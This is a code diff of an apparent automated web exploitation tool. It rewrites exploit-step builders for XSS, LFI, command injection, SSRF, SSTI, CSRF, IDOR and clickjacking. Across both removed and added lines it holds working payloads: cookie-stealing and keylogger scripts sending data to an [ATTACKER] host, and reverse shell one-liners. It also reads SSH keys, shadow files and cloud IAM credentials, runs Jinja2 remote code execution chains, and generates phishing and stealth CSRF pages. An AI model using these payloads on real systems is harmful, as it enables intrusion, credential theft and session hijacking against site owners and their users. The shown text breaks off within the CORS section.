+             "validate": _xss_reflect_check("onerror="),
              "note": "Bypasses script tag filters"},
             {"title": "Test svg/onload",
-             "command": _curl_param(_xp_svg),
+             "request": _get_param("<svg/onload=alert(1)>"),
+             "validate": _xss_reflect_check("onload="),
              "note": "Bypasses img and script filters"},
-            {"title": "Test attribute injection (no brackets)",
-             "command": _curl_param(_xp_attr),
-             "note": "Attribute injection — no angle brackets needed"},
-            {"title": "Cookie exfiltration",
-             "command": _curl_param(_xp_cookie),
+            {"title": "Test attribute injection",
+             "request": _get_param("\" onfocus=alert(1) autofocus=\""),
+             "validate": _xss_reflect_check("onfocus="),
+             "note": "No angle brackets — bypasses most WAFs"},
+            {"title": "Cookie exfiltration payload",
+             "request": _get_param("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>"),
+             "validate": _xss_reflect_check("document.cookie"),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
-            {"title": "Full session theft",
-             "command": _curl_param(_xp_full),
-             "warning": "Exfiltrates cookies + localStorage + URL",
-             "risk": "HIGH"},
             {"title": "Generate credential phishing page",
-             "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"xss_phish_{secrets.token_hex(3)}.html",
                  "content": xss_phish_html,
-                 "note": "Functional phishing page. Victim enters credentials, "
-                         "POST to [ATTACKER]/c, then redirects to real site.",
+                 "note": "Functional phishing page — captures credentials via POST.",
              }},
         ]
 
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
-        stored_xss_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>Stored XSS PoC</h2>\n"
-            f"<p><strong>Inject point:</strong> {target}</p>\n"
-            f"<p><strong>Render point:</strong> {base_url.rstrip('/')}{render}</p>\n"
-            f"<h3>Payload Options:</h3>\n"
-            f"<pre>Cookie stealer:\n"
-            f"&lt;script&gt;new Image().src='https://[ATTACKER]/c?c='+document.cookie&lt;/script&gt;\n\n"
-            f"BeEF hook:\n"
-            f"&lt;script src='https://[ATTACKER]/hook.js'&gt;&lt;/script&gt;\n\n"
-            f"Persistent keylogger:\n"
-            f"&lt;script&gt;document.onkeypress=function(e){{"
-            f"fetch('https://[ATTACKER]/k?k='+e.key)}}&lt;/script&gt;\n</pre>\n"
-            f"</body></html>"
-        )
-        _sxss_cookie = quote("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>")
-        _sxss_keylog = quote("<script>document.onkeypress=function(e){fetch('[ATTACKER]/k?k='+e.key)}</script>")
+        def _sxss_verify(r: ExploitResult):
+            if "<script>" in r.response_body.lower() or "onerror=" in r.response_body.lower():
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "Script tag found in rendered page"
+                r.false_positive_risk = "low"
         steps = [
             {"title": "Inject persistent cookie-stealing payload",
-             "command": _curl(target, f"-X POST --data-urlencode {shlex.quote(param + '=' + _sxss_cookie)}"),
-             "warning": "Injects a persistent payload into the application"},
+             "request": _post(target, {param: "<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>"}),
+             "warning": "Injects a persistent payload",
+             "validate": lambda r: setattr(r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent keylogger payload",
-             "command": _curl(target, f"-X POST --data-urlencode {shlex.quote(param + '=' + _sxss_keylog)}"),
+             "request": _post(target, {param: "<script>document.onkeypress=function(e){fetch('[ATTACKER]/k?k='+e.key)}</script>"}),
              "warning": "Injects persistent keylogger",
              "risk": "CRITICAL"},
-            {"title": "Verify payload renders on target page",
-             "command": f"{_curl(base_url.rstrip('/') + render)} | grep -ic 'script'",
-             "note": "Count > 0 = payload persisted on the render page"},
-            {"title": "Generate stored XSS attack documentation",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"stored_xss_{secrets.token_hex(3)}.html",
-                 "content": stored_xss_html,
-                 "note": "Reference document with inject/render points and payload options.",
-             }},
+            {"title": "Verify payload renders",
+             "request": _get(base_url.rstrip("/") + render),
+             "validate": _sxss_verify,
+             "note": "Checks if injected script appears on the render page"},
         ]
 
     elif etype == "lfi":
-        lfi_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>LFI Exploitation PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Payload Reference:</h3>\n"
-            f"<table border='1' cellpadding='5'>\n"
-            f"<tr><th>Target</th><th>Payload</th></tr>\n"
-            f"<tr><td>/etc/passwd</td><td>../../../../../../etc/passwd</td></tr>\n"
-            f"<tr><td>/etc/shadow</td><td>../../../../../../etc/shadow</td></tr>\n"
-            f"<tr><td>SSH keys</td><td>../../../../../../root/.ssh/id_rsa</td></tr>\n"
-            f"<tr><td>PHP source</td><td>php://filter/convert.base64-encode/resource=index</td></tr>\n"
-            f"<tr><td>Proc self</td><td>/proc/self/environ</td></tr>\n"
-            f"<tr><td>Apache log</td><td>/var/log/apache2/access.log</td></tr>\n"
-            f"<tr><td>Nginx log</td><td>/var/log/nginx/access.log</td></tr>\n"
-            f"<tr><td>AWS creds</td><td>../../../../../../home/ubuntu/.aws/credentials</td></tr>\n"
-            f"</table>\n"
-            f"<h3>Log Poisoning (LFI to RCE):</h3>\n"
-            f"<pre>1. Inject PHP into User-Agent:\n"
-            f"   curl -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;' {target_base}\n"
-            f"2. Include the log file:\n"
-            f"   {target_base}?{param}=/var/log/apache2/access.log&amp;cmd=id</pre>\n"
-            f"</body></html>"
-        )
-        _trav = "../../../../../../"
+        def _lfi_check(r: ExploitResult):
+            body = r.response_body
+            if "root:" in body and ":0:0:" in body:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "Unix /etc/passwd content detected"
+                r.false_positive_risk = "very_low"
+            elif "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "SSH private key content detected"
+                r.false_positive_risk = "very_low"
+            elif r.status_code == 200 and len(body) > 20:
+                if any(s in body.lower() for s in ("password", "db_host", "api_key", "secret")):
+                    r.success = True
+                    r.confidence = 0.7
+                    r.evidence = "Sensitive keywords in response"
+                    r.false_positive_risk = "medium"
+
+        # Adaptive traversal depths
+        _traversals = ["../" * d for d in (3, 5, 7, 10)]
         steps = [
-            {"title": "Read /etc/passwd",
-             "command": _curl(target),
-             "note": "Look for root:x:0:0: in output"},
-            {"title": "Read /etc/shadow",
-             "command": _curl_param(quote(_trav + "etc/shadow")),
-             "warning": "Attempts to read password hashes"},
-            {"title": "Read application config",
-             "command": _curl_param(quote("../../../var/www/html/config.php")),
-             "note": "Look for DB credentials, API keys, secrets"},
-            {"title": "Read source via PHP filter",
-             "command": f"{_curl_param(quote('php://filter/convert.base64-encode/resource=index.php'))} | base64 -d 2>/dev/null",
-             "note": "Decodes PHP source code"},
-            {"title": "Read /proc/self/environ",
-             "command": _curl_param("/proc/self/environ"),
-             "warning": "Reads process environment variables"},
-            {"title": "Read SSH private key",
-             "command": _curl_param(quote(_trav + "root/.ssh/id_rsa")),
-             "warning": "Attempts to read server SSH key",
-             "risk": "CRITICAL"},
-            {"title": "Null byte bypass (legacy PHP)",
-             "command": _curl_param(quote(_trav + "etc/passwd") + "%00"),
-             "note": "Null byte terminates appended extensions (PHP < 5.3.4)"},
-            {"title": "Double encoding bypass",
-             "command": _curl_param("%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
-             "note": "Bypasses single-decode WAF filters"},
-            {"title": "Generate LFI payload reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"lfi_payloads_{secrets.token_hex(3)}.html",
-                 "content": lfi_html,
-                 "note": "Comprehensive LFI payload reference with log poisoning guide.",
-             }},
+            {"title": "Confirm initial LFI",
+             "request": _get(target),
+             "validate": _lfi_check,
+             "note": "Check if the original finding URL returns file content"},
         ]
+        for depth, trav in enumerate(_traversals):
+            steps.append({
+                "title": f"Read /etc/passwd (depth {len(trav)//3})",
+                "request": _get_param(trav + "etc/passwd"),
+                "validate": _lfi_check,
+                "note": f"Traversal depth: {len(trav)//3} directories",
+            })
+        steps.extend([
+            {"title": "Read /proc/self/environ",
+             "request": _get_param("/proc/self/environ"),
+             "validate": _lfi_check,
+             "warning": "Reads process environment variables"},
+            {"title": "PHP filter (base64 source read)",
+             "request": _get_param("php://filter/convert.base64-encode/resource=index.php"),
+             "validate": lambda r: setattr(r, 'evidence', 'Check for base64 data in response'),
+             "note": "Decodes to PHP source code"},
+            {"title": "Read SSH private key",
+             "request": _get_param("../../../../../../root/.ssh/id_rsa"),
+             "validate": _lfi_check,
+             "warning": "Reads server SSH key",
+             "risk": "CRITICAL"},
+            {"title": "Null byte bypass",
+             "request": _get_param("../../../../../../etc/passwd%00"),
+             "validate": _lfi_check,
+             "note": "Terminates appended extensions (legacy PHP)"},
+            {"title": "Double encoding bypass",
+             "request": _get_param("%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
+             "validate": _lfi_check,
+             "note": "Bypasses single-decode WAF filters"},
+            {"title": "Windows path fallback",
+             "request": _get_param("..\\..\\..\\..\\..\\..\\windows\\win.ini"),
+             "validate": lambda r: (
+                 setattr(r, 'success', "[fonts]" in r.response_body) or
+                 setattr(r, 'evidence', "Windows win.ini content" if "[fonts]" in r.response_body else "Not Windows")
+             ),
+             "note": "Detects Windows targets via win.ini"},
+        ])
 
     elif etype == "command_injection":
-        cmdi_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>Command Injection PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Payloads:</h3>\n"
-            f"<table border='1' cellpadding='5'>\n"
-            f"<tr><th>Separator</th><th>Payload</th><th>Notes</th></tr>\n"
-            f"<tr><td>Semicolon</td><td>;id</td><td>Unix chain</td></tr>\n"
-            f"<tr><td>Pipe</td><td>|id</td><td>Pipe output</td></tr>\n"
-            f"<tr><td>AND</td><td>&amp;&amp;id</td><td>Conditional exec</td></tr>\n"
-            f"<tr><td>Backtick</td><td>`id`</td><td>Subshell</td></tr>\n"
-            f"<tr><td>$() subshell</td><td>$(id)</td><td>POSIX subshell</td></tr>\n"
-            f"<tr><td>Newline</td><td>%0aid</td><td>URL encoded newline</td></tr>\n"
-            f"</table>\n"
-            f"<h3>Reverse Shell Commands:</h3>\n"
-            f"<pre>bash -i >& /dev/tcp/[ATTACKER]/4444 0>&1\n"
-            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"[ATTACKER]\",4444));"
-            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
-            f"nc -e /bin/bash [ATTACKER] 4444</pre>\n"
-            f"</body></html>"
-        )
-        steps = [
-            {"title": "Confirm command execution (id)",
-             "command": _curl(target),
-             "note": "Look for uid=, whoami result, or command output"},
-            {"title": "Test semicolon separator",
-             "command": _curl_param(quote(";id")),
-             "note": "Unix command chain via semicolon"},
-            {"title": "Test pipe separator",
-             "command": _curl_param(quote("|id")),
-             "note": "Pipe operator"},
-            {"title": "Test $() subshell",
-             "command": _curl_param(quote("$(id)")),
-             "note": "POSIX subshell execution on server"},
-            {"title": "Read /etc/passwd",
-             "command": _curl_param(quote(";cat /etc/passwd")),
-             "warning": "Reads system user file"},
-            {"title": "Enumerate system info",
-             "command": _curl_param(quote(";uname -a;whoami;pwd")),
-             "note": "Gathers OS, user, and directory info"},
-            {"title": "Check for outbound connectivity",
-             "command": _curl_param(quote(";curl -s https://ifconfig.me")),
-             "note": "If output = IP, the server can make outbound requests (reverse shell possible)"},
-            {"title": "Reverse shell setup (example — COMMENTED)",
-             "command": (
-                 f"# Set up listener first: nc -lvnp 4444\n"
-                 f"# curl -s {sp} \"{target_base}?{param}="
-                 f";bash -c 'bash -i >& /dev/tcp/[ATTACKER]/4444 0>&1'\""
-             ),
-             "warning": "Opens a reverse shell. Replace [ATTACKER]/4444 with your listener.",
-             "risk": "CRITICAL",
-             "note": "Listener: nc -lvnp 4444"},
-            {"title": "Generate command injection payload reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"cmdi_payloads_{secrets.token_hex(3)}.html",
-                 "content": cmdi_html,
-                 "note": "Command injection payload reference with reverse shell examples.",
-             }},
+        def _cmdi_check(r: ExploitResult):
+            body = r.response_body
+            if _re.search(r"uid=\d+", body):
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "uid= found — command execution confirmed"
+                r.false_positive_risk = "very_low"
+            elif "root:" in body and ":0:0:" in body:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = "/etc/passwd content in response"
+                r.false_positive_risk = "low"
+            elif r.status_code == 200 and len(body) > 10:
+                r.confidence = 0.3
+                r.evidence = "Got response — verify manually"
+
+        separators = [
+            (";id", "Semicolon"),
+            ("|id", "Pipe"),
+            ("$(id)", "$() subshell"),
+            ("`id`", "Backtick"),
         ]
+        steps = [
+            {"title": "Confirm original finding",
+             "request": _get(target),
+             "validate": _cmdi_check,
+             "note": "Check if the scan's original URL returns command output"},
+        ]
+        for payload, sep_name in separators:
+            steps.append({
+                "title": f"Test {sep_name} separator",
+                "request": _get_param(payload),
+                "validate": _cmdi_check,
+                "note": f"Injects via {sep_name}",
+            })
+        steps.extend([
+            {"title": "Read /etc/passwd",
+             "request": _get_param(";cat /etc/passwd"),
+             "validate": _cmdi_check,
+             "warning": "Reads system user file"},
+            {"title": "System enumeration",
+             "request": _get_param(";uname -a;whoami;pwd"),
+             "validate": _cmdi_check,
+             "note": "Gathers OS, user, directory info"},
+        ])
 
     elif etype == "ssrf":
-        ssrf_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>SSRF Exploitation PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Cloud Metadata Endpoints:</h3>\n"
-            f"<table border='1' cellpadding='5'>\n"
-            f"<tr><th>Provider</th><th>URL</th></tr>\n"
-            f"<tr><td>AWS IMDSv1</td><td>http://169.254.169.254/latest/meta-data/</td></tr>\n"
-            f"<tr><td>AWS IAM creds</td><td>http://169.254.169.254/latest/meta-data/iam/security-credentials/</td></tr>\n"
-            f"<tr><td>GCP</td><td>http://metadata.google.internal/computeMetadata/v1/</td></tr>\n"
-            f"<tr><td>Azure</td><td>http://169.254.169.254/metadata/instance?api-version=2021-02-01</td></tr>\n"
-            f"<tr><td>DigitalOcean</td><td>http://169.254.169.254/metadata/v1/</td></tr>\n"
-            f"</table>\n"
-            f"<h3>Internal Network Scan:</h3>\n"
-            f"<pre>Common targets: 192.168.1.1, 10.0.0.1, 172.16.0.1\n"
-            f"Redis: http://127.0.0.1:6379\n"
-            f"Elasticsearch: http://127.0.0.1:9200\n"
-            f"Docker API: http://127.0.0.1:2375</pre>\n"
-            f"</body></html>"
-        )
-        steps = [
-            {"title": "Read cloud metadata (AWS IMDSv1)",
-             "command": _curl(target),
-             "note": "Look for ami-id, instance-id, security-credentials"},
-            {"title": "List IAM roles",
-             "command": _curl_param(quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/")),
-             "warning": "Lists cloud IAM roles"},
-            {"title": "Extract IAM credentials",
-             "command": _curl_param(quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]")),
-             "warning": "Extracts cloud IAM credentials",
-             "risk": "CRITICAL",
-             "note": "[ROLE_NAME] auto-filled from previous step output"},
-            {"title": "Check GCP metadata",
-             "command": _curl_param(quote("http://metadata.google.internal/computeMetadata/v1/instance/")),
-             "note": "Requires Metadata-Flavor header — may fail via naive SSRF"},
-            {"title": "Probe internal Redis (port 6379)",
-             "command": _curl_param(quote("http://127.0.0.1:6379/info")),
-             "note": "Redis info — if present, can lead to RCE via SSRF"},
-            {"title": "Probe internal Elasticsearch (port 9200)",
-             "command": _curl_param(quote("http://127.0.0.1:9200/_cat/indices")),
-             "note": "Lists all Elasticsearch indices"},
-            {"title": "Scan internal network",
-             "command": (
-                 f"for ip in 127.0.0.1 192.168.1.1 10.0.0.1 172.16.0.1; do "
-                 f"echo \"=== $ip ===\"; curl -s --max-time 3 {sp} "
-                 f"{shlex.quote(target_base + '?' + param + '=')}\"http://$ip/\" | head -3; done"
-             ),
-             "note": "Scans common internal IPs for live services"},
-            {"title": "Generate SSRF payload reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"ssrf_payloads_{secrets.token_hex(3)}.html",
-                 "content": ssrf_html,
-                 "note": "SSRF payload reference for cloud metadata and internal scanning.",
-             }},
+        def _ssrf_check(r: ExploitResult):
+            body = r.response_body
+            if any(s in body for s in ("ami-id", "instance-id", "AccessKeyId", "SecretAccessKey")):
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "Cloud metadata content detected"
+                r.false_positive_risk = "very_low"
+            elif "redis_version" in body or "connected_clients" in body:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = "Redis info response detected"
+            elif r.status_code == 200 and len(body) > 20:
+                r.confidence = 0.4
+                r.evidence = "Got response — verify content"
+
+        metadata_targets = [
+            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
+            ("AWS IAM roles", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+            ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/instance/"),
+            ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+            ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
         ]
+        internal_targets = [
+            ("Localhost", "http://127.0.0.1/"),
+            ("Redis", "http://127.0.0.1:6379/info"),
+            ("Elasticsearch", "http://127.0.0.1:9200/_cat/indices"),
+            ("Docker API", "http://127.0.0.1:2375/containers/json"),
+        ]
+        steps = [{"title": "Confirm original SSRF", "request": _get(target),
+                  "validate": _ssrf_check, "note": "Check original finding URL"}]
+        for name, url in metadata_targets:
+            steps.append({"title": f"SSRF → {name}", "request": _get_param(url),
+                          "validate": _ssrf_check, "warning": f"Reads {name}"})
+        for name, url in internal_targets:
+            steps.append({"title": f"Probe {name}", "request": _get_param(url),
+                          "validate": _ssrf_check, "note": f"Internal service: {name}"})
 
     elif etype == "ssti":
-        ssti_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>SSTI Exploitation PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<h3>Detection Payloads:</h3>\n"
-            f"<pre>{{{{7*7}}}} -> 49 (Jinja2/Twig)\n"
-            f"${{7*7}} -> 49 (Freemarker/Velocity)\n"
-            f"#{{7*7}} -> 49 (Thymeleaf)\n"
-            f"<%= 7*7 %> -> 49 (ERB/EJS)</pre>\n"
-            f"<h3>Jinja2 RCE Chain:</h3>\n"
-            f"<pre>{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n"
-            f"{{{{''.__class__.__mro__[1].__subclasses__()}}}}\n"
-            f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}}}</pre>\n"
-            f"</body></html>"
-        )
-        _ssti_49 = quote("{{7*7}}")
-        _ssti_el = quote("${7*7}")
-        _ssti_cls = quote("{{''.__class__.__mro__[1].__subclasses__()}}")
-        _ssti_rce_passwd = quote("{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}")
-        _ssti_rce_id = quote("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
-        steps = [
-            {"title": "Confirm template evaluation (7*7=49)",
-             "command": f"{_curl_param(_ssti_49)} | grep 49",
-             "note": "49 in response = server evaluated the expression"},
-            {"title": "Test alternative engine (${7*7})",
-             "command": _curl_param(_ssti_el),
-             "note": "Tests Freemarker/Velocity/EL syntax"},
-            {"title": "List Python classes (Jinja2)",
-             "command": _curl_param(_ssti_cls),
-             "note": "Lists available Python classes for RCE chain"},
-            {"title": "Read /etc/passwd via os.popen (Jinja2)",
-             "command": _curl_param(_ssti_rce_passwd),
-             "warning": "Reads /etc/passwd via template-based RCE",
-             "risk": "CRITICAL"},
-            {"title": "Execute OS command (Jinja2 — id)",
-             "command": _curl_param(_ssti_rce_id),
-             "warning": "Executes OS commands on the server",
-             "risk": "CRITICAL"},
-            {"title": "Generate SSTI payload reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"ssti_payloads_{secrets.token_hex(3)}.html",
-                 "content": ssti_html,
-                 "note": "SSTI detection and exploitation reference for multiple engines.",
-             }},
+        def _ssti_check(r: ExploitResult):
+            if "49" in r.response_body:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = "49 found — template expression evaluated"
+                r.false_positive_risk = "low"
+            elif _re.search(r"uid=\d+", r.response_body):
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "OS command output in template response"
+                r.false_positive_risk = "very_low"
+
+        ssti_payloads = [
+            ("Jinja2/Twig (7*7)", "{{7*7}}"),
+            ("Freemarker/Velocity", "${7*7}"),
+            ("ERB/EJS", "<%= 7*7 %>"),
         ]
+        steps = []
+        for name, payload in ssti_payloads:
+            steps.append({
+                "title": f"Test {name}",
+                "request": _get_param(payload),
+                "validate": _ssti_check,
+                "note": f"49 in response = {name} engine confirmed",
+            })
+        steps.extend([
+            {"title": "Jinja2 RCE: read /etc/passwd",
+             "request": _get_param("{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"),
+             "validate": _ssti_check,
+             "warning": "Template-based RCE",
+             "risk": "CRITICAL"},
+            {"title": "Jinja2 RCE: execute id",
+             "request": _get_param("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
+             "validate": _ssti_check,
+             "warning": "Executes OS commands",
+             "risk": "CRITICAL"},
+        ])
 
     elif etype == "csrf":
         csrf_auto = (
@@ -2865,98 +2987,80 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}}"
             f"@keyframes spin{{to{{transform:rotate(360deg)}}}}"
             f"</style></head><body>"
-            f"<div class='box'>"
-            f"<div class='spinner'></div>"
+            f"<div class='box'><div class='spinner'></div>"
             f"<h2 style='color:#1c1e21;margin:16px 0 8px'>Verifying your account</h2>"
-            f"<p style='color:#65676b'>This will only take a moment...</p>"
-            f"</div>"
+            f"<p style='color:#65676b'>This will only take a moment...</p></div>"
             f"<iframe name='_x' style='position:absolute;left:-9999px'></iframe>"
             f"<form id='xf' method='POST' action='{target}' target='_x'>"
-            f"<input type='hidden' name='{param}' value='attacker_value'/>"
-            f"</form>"
-            f"<script>"
-            f"document.getElementById('xf').submit();"
-            f"setTimeout(function(){{window.location='{base_url}';}},2500);"
-            f"</script>"
+            f"<input type='hidden' name='{param}' value='attacker_value'/></form>"
+            f"<script>document.getElementById('xf').submit();"
+            f"setTimeout(function(){{window.location='{base_url}';}},2500);</script>"
             f"</body></html>"
         )
+        def _csrf_token_check(r: ExploitResult):
+            body = r.response_body.lower()
+            has_token = any(t in body for t in ("csrf", "_token", "nonce", "authenticity_token"))
+            r.success = not has_token
+            r.confidence = 0.7 if not has_token else 0.3
+            r.evidence = "No CSRF token found" if not has_token else "CSRF token present"
+            r.false_positive_risk = "medium" if not has_token else "low"
+
+        def _csrf_samesite_check(r: ExploitResult):
+            hdrs = str(r.response_headers).lower()
+            if "samesite=none" in hdrs or "samesite" not in hdrs:
+                r.success = True
+                r.confidence = 0.6
+                r.evidence = "SameSite not enforced — cookies sent cross-origin"
+            else:
+                r.evidence = "SameSite cookie set — CSRF may be blocked"
+
         steps = [
-            {"title": "Check for CSRF token presence",
-             "command": (
-                 f"{_curl(target)} | "
-                 f"grep -ioE '(csrf|_token|nonce|authenticity_token)[^\"]*\"[^\"]*\"' | head -5"
-             ),
-             "note": "No results = no CSRF protection = exploitable"},
-            {"title": "Check SameSite cookie attribute",
-             "command": f"{_curl(target, '-I')} | grep -i 'set-cookie' | grep -i 'samesite'",
-             "note": "No SameSite or SameSite=None = cookies sent cross-origin"},
+            {"title": "Check for CSRF token",
+             "request": _get(target),
+             "validate": _csrf_token_check,
+             "note": "No token = exploitable"},
+            {"title": "Check SameSite cookie",
+             "request": {"method": "HEAD", "url": target},
+             "validate": _csrf_samesite_check,
+             "note": "Missing SameSite = cookies sent cross-origin"},
             {"title": "Generate auto-submit CSRF page",
-             "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"csrf_auto_{secrets.token_hex(3)}.html",
                  "content": csrf_auto,
-                 "note": "Auto-submits on page load. Form submits to hidden iframe "
-                         "so the victim stays on the attacker page.",
+                 "note": "Auto-submits via hidden iframe on page load.",
              }},
-            {"title": "Generate stealth CSRF page (social engineering)",
-             "command": "(file will be generated automatically)",
+            {"title": "Generate stealth CSRF page",
              "generate_file": {
                  "filename": f"csrf_stealth_{secrets.token_hex(3)}.html",
                  "content": csrf_stealth,
-                 "note": "Polished verification page. Submits CSRF in background, "
-                         "then redirects victim to legit site after 2.5s.",
+                 "note": "Verification spinner. CSRF fires in background, redirects after 2.5s.",
              }},
             {"title": "Verify action was performed",
-             "command": _curl(target),
+             "request": _get(target),
+             "validate": lambda r: setattr(r, 'evidence', f"HTTP {r.status_code} — compare with pre-attack"),
              "note": "Compare response to pre-attack state"},
         ]
 
     elif etype == "idor":
-        idor_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>IDOR Enumeration Results</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Enumeration Strategy:</h3>\n"
-            f"<pre>1. Sequential IDs: 1, 2, 3, ...\n"
-            f"2. UUID guessing (if predictable pattern)\n"
-            f"3. Parameter tampering in cookies/headers\n"
-            f"4. Horizontal: access other users' data at same privilege\n"
-            f"5. Vertical: access admin endpoints with user token</pre>\n"
-            f"</body></html>"
-        )
-        _idor_base = shlex.quote(target_base + "?" + param + "=")
-        steps = [
-            {"title": "Enumerate accessible resources (IDs 1-20)",
-             "command": (
-                 f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; "
-                 f"curl -s {sp} {_idor_base}\"$i\" | head -3; echo; done"
-             ),
-             "note": "Compare responses — different content per ID = confirmed IDOR"},
-            {"title": "Compare response sizes across IDs",
-             "command": (
-                 f"for i in $(seq 1 20); do "
-                 f"SIZE=$(curl -s {sp} {_idor_base}\"$i\" | wc -c); "
-                 f"echo \"ID $i: $SIZE bytes\"; done"
-             ),
-             "note": "Different sizes indicate different data — IDOR confirmed"},
-            {"title": "Targeted extraction (specific ID)",
-             "command": _curl_param("1"),
-             "note": "Replace 1 with a target user's ID"},
-            {"title": "Test negative/zero IDs",
-             "command": (
-                 f"echo '=== ID 0 ===' && {_curl_param('0')} | head -3 && "
-                 f"echo '=== ID -1 ===' && {_curl_param('-1')} | head -3"
-             ),
-             "note": "Edge case IDs may reveal admin/system data"},
-            {"title": "Generate IDOR enumeration documentation",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"idor_enum_{secrets.token_hex(3)}.html",
-                 "content": idor_html,
-                 "note": "IDOR enumeration strategy and results documentation.",
-             }},
-        ]
+        def _idor_check(r: ExploitResult):
+            if r.status_code == 200 and len(r.response_body) > 20:
+                r.success = True
+                r.confidence = 0.6
+                r.evidence = f"Got {len(r.response_body)} bytes for this ID"
+                r.false_positive_risk = "medium"
+            elif r.status_code == 403:
+                r.evidence = "403 Forbidden — access denied for this ID"
+            elif r.status_code == 404:
+                r.evidence = "404 — ID not found"
+
+        steps = []
+        for test_id in ["1", "2", "0", "-1", "999999"]:
+            steps.append({
+                "title": f"Access resource ID {test_id}",
+                "request": _get_param(test_id),
+                "validate": _idor_check,
+                "note": f"Testing access to ID {test_id}",
+            })
 
     elif etype == "clickjacking":
         cj_html = (
@@ -3008,10 +3112,23 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"<button class='accept'>Accept All</button></div>"
             f"</div></body></html>"
         )
+        def _cj_header_check(r: ExploitResult):
+            hdrs = str(r.response_headers).lower()
+            has_xfo = "x-frame-options" in hdrs
+            has_csp_frame = "frame-ancestors" in hdrs
+            if not has_xfo and not has_csp_frame:
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "No X-Frame-Options or frame-ancestors CSP — frameable"
+                r.false_positive_risk = "low"
+            else:
+                r.evidence = f"XFO={has_xfo}, CSP frame-ancestors={has_csp_frame}"
+
         steps = [
-            {"title": "Verify missing X-Frame-Options / frame-ancestors",
-             "command": f"{_curl(target, '-I')} | grep -i 'x-frame-options\\|frame-ancestors'",
-             "note": "No output = frameable = clickjacking possible"},
+            {"title": "Check X-Frame-Options / frame-ancestors",
+             "request": {"method": "HEAD", "url": target},
+             "validate": _cj_header_check,
+             "note": "Missing = page can be framed = clickjacking possible"},
             {"title": "Generate basic clickjacking exploit page",
              "command": "(file will be generated automatically)",
              "generate_file": {
@@ -3078,16 +3195,32 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"}})();"
             f"</script></body></html>"
         )
+        def _cors_check(origin: str):
+            def _check(r: ExploitResult):
+                acao = r.response_headers.get("Access-Control-Allow-Origin", "")
+                acac = r.response_headers.get("Access-Control-Allow-Credentials", "")
+                if acao == origin or acao == "*":
+                    r.success = True
+                    r.confidence = 0.9 if acac.lower() == "true" else 0.7
+                    r.evidence = f"ACAO={acao}, ACAC={acac}"
+                    r.false_positive_risk = "low" if acac.lower() == "true" else "medium"
+                else:
+                    r.evidence = f"ACAO={acao or 'absent'}"
+            return _check
+
         steps = [
